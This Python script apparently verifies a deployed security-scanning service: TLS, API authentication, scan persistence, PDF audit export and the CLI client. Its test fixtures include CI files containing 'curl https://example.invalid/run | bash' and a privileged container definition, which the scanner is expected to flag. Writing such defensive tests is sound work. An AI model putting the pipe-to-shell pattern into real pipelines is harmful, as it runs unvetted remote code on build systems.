"""Verify the real deployed non-PI API, TLS, auth, persistence, and clients."""
import argparse
import json
import os
import ssl
import subprocess
import sys
from pathlib import Path
from urllib.request import Request,urlopen
from urllib.error import HTTPError
from guardian_cli import deployment_config
from guardian_http import request_json,wait_final

ROOT=Path(__file__).resolve().parents[1]


def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--config',type=Path,default=ROOT/'.data/production-pass/compose.env')
    parser.add_argument('--url',default='https://localhost:3343/api')
    parser.add_argument('--ca',type=Path,default=ROOT/'.data/production-pass/tls/server.crt')
    parser.add_argument('--output',type=Path,default=ROOT/'.data/production-pass/demo-verification.json')
    args=parser.parse_args();deployment_config(args.config)
    os.environ['GUARDIAN_CA_FILE']=str(args.ca.resolve())
    context=ssl.create_default_context(cafile=str(args.ca))
    report={'deployment':'Docker Compose with verified localhost TLS','prompt_injection_tested':False,'checks':{},'scans':{}}
    try:
        with urlopen(args.url+'/scans',context=context,timeout=10):raise AssertionError('unauthenticated history accessible')
    except HTTPError as error:
        assert error.code==401
        report['checks']['unauthenticated_history_blocked']=True
    fixtures={
        'compose':{'filename':'compose.yaml','content':'services:\n  app:\n    image: alpine:3.20\n    privileged: true\n'},
        'github':{'filename':'.github/workflows/demo.yml','content':'on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/run | bash\n'},
        'gitlab':{'filename':'.gitlab-ci.yml','content':'build:\n  script: curl https://example.invalid/run | bash\n'},
        'empty_dependency':{'filename':'pyproject.toml','content':'[project]\nname="demo"\nversion="0.1.0"\ndependencies=[]\n'},
        'cargo':{'filename':'Cargo.toml','content':'[dependencies]\nserde="=1.0.228"\n'},
        'native_image':{'filename':'Dockerfile','content':'FROM alpine:3.20\nUSER 10001\nHEALTHCHECK CMD ["/bin/true"]\nCMD ["/bin/true"]\n',
            'options':{'enable_cve_scan':True,'enable_hardening':False}},
    }
    for name,artifact in fixtures.items():
        response=wait_final(args.url,request_json(args.url+'/analyze',artifact),160)
        persisted=request_json(args.url+'/scans/'+response['request_id'])
        assert persisted==response
        assert response['scan_status']=='final'
        report['scans'][name]={'request_id':response['request_id'],'recommendation':response['recommendation'],
            'coverage':response['routing']['overall_coverage'],'agents':{item['agent_name']:item['status'] for item in response['detector_results']}}
        if name=='compose':assert response['recommendation']=='reject'
        if name in {'github','gitlab'}:assert response['recommendation']!='accept'
        if name=='native_image':
            detector=next(item for item in response['detector_results'] if item['agent_name']=='docker_security')
            scans=(detector.get('evidence') or {}).get('native_image_scans',[])
            assert scans and scans[0]['layers_verified']>0 and scans[0]['package_count']>0
            report['checks']['native_oci_inventory_and_advisory_callback']=True
    rid=report['scans']['compose']['request_id']
    request=Request(args.url+'/scans/'+rid+'/audit.pdf',headers={'Authorization':'Bearer '+os.environ['GUARDIAN_API_KEY']})
    with urlopen(request,context=context,timeout=10) as response:assert response.read(5)==b'%PDF-'
    report['checks']['authenticated_pdf_export']=True
    source=ROOT/'.data/production-pass/demo-fixtures';source.mkdir(exist_ok=True)
    (source/'.gitlab-ci.yml').write_text(fixtures['gitlab']['content'])
    cli=subprocess.run([str(Path.home()/'.local/bin/guardian'),str(source),
        '--deployment-config',str(args.config),'--url',args.url,'--ca-file',str(args.ca)],capture_output=True,text=True)
    assert cli.returncode in {2,3},cli.stderr
    json.loads(cli.stdout);report['checks']['installed_cli_over_tls']=True
    args.output.parent.mkdir(parents=True,exist_ok=True)
    args.output.write_text(json.dumps(report,indent=2)+'\n')
    print(json.dumps(report,indent=2));return 0


if __name__=='__main__':sys.exit(main())
